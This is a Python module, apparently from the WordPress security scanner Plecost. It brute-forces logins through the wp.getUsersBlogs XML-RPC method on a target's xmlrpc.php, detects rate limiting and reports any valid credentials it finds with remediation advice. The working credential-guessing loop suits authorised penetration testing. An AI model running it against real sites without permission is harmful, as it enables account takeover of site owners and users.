"""
XML-RPC attacker — uses wp.getUsersBlogs to test credentials.

Success: status 200 AND <methodResponse> in body AND no <fault> element.
Rate limiting: 3 consecutive 429/403 responses → detected.
"""
from __future__ import annotations

from plecost.engine.context import ScanContext
from plecost.engine.http_client import PlecostHTTPClient
from plecost.models import Finding, Severity
from plecost.modules.brute.base import BaseAttacker


def _mask_password(pw: str) -> str:
    """Mask password for evidence: show first and last char only."""
    if len(pw) <= 3:
        return pw[:1] + "***"
    return pw[:1] + "***" + pw[-1:]

_PAYLOAD_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""

_HEADERS = {"Content-Type": "application/xml"}
_RATE_LIMIT_THRESHOLD = 3


class XMLRPCAttacker(BaseAttacker):
    """Brute-force via XML-RPC wp.getUsersBlogs method."""

    async def attack(
        self,
        ctx: ScanContext,
        http: PlecostHTTPClient,
        usernames: list[str],
        passwords: list[str],
    ) -> list[Finding]:
        xmlrpc_url = f"{ctx.url}/xmlrpc.php"
        found: list[tuple[str, str]] = []
        rate_limit_hits = 0
        rate_limited = False

        for username in usernames:
            if rate_limited:
                break
            for password in passwords:
                if rate_limited:
                    break
                try:
                    payload = _PAYLOAD_TEMPLATE.format(
                        username=username, password=password
                    )
                    r = await http.post(
                        xmlrpc_url, content=payload, headers=_HEADERS
                    )
                    if r.status_code in (429, 403):
                        rate_limit_hits += 1
                        if rate_limit_hits >= _RATE_LIMIT_THRESHOLD:
                            rate_limited = True
                            break
                        continue
                    rate_limit_hits = 0
                    # Success: valid XML-RPC response with <methodResponse> and no <fault>
                    if (
                        r.status_code == 200
                        and "<methodResponse>" in r.text
                        and "<fault>" not in r.text
                    ):
                        found.append((username, password))
                except Exception:
                    rate_limit_hits += 1
                    if rate_limit_hits >= _RATE_LIMIT_THRESHOLD:
                        rate_limited = True
                        break

        findings: list[Finding] = []
        if found:
            cred_list = "\n".join(f"  • {u} / {_mask_password(p)}" for u, p in found)
            findings.append(Finding(
                id="PC-BRUTE-001", remediation_id="REM-BRUTE-001",
                title="Valid credentials found via XML-RPC brute force",
                severity=Severity.CRITICAL,
                description=(
                    f"Brute force via XML-RPC found {len(found)} valid credential pair(s)."
                ),
                evidence={"url": xmlrpc_url, "credentials": cred_list},
                remediation=(
                    "Change found passwords immediately. Disable XML-RPC if not needed. "
                    "Enable 2FA and implement account lockout."
                ),
                references=["https://kinsta.com/blog/xmlrpc-php/#xmlrpc-brute-force-attacks"],
                cvss_score=9.8, module="brute"
            ))

        if rate_limited and not found:
            findings.append(Finding(
                id="PC-BRUTE-004", remediation_id="REM-BRUTE-004",
                title="XML-RPC brute force protection confirmed",
                severity=Severity.INFO,
                description=(
                    "Rate limiting or blocking was detected on the XML-RPC endpoint "
                    "after repeated authentication attempts. Protection is active."
                ),
                evidence={"url": xmlrpc_url, "consecutive_blocks": str(rate_limit_hits)},
                remediation="No action required. Rate limiting is a positive security control.",
                references=[],
                cvss_score=0.0, module="brute"
            ))

        return findings
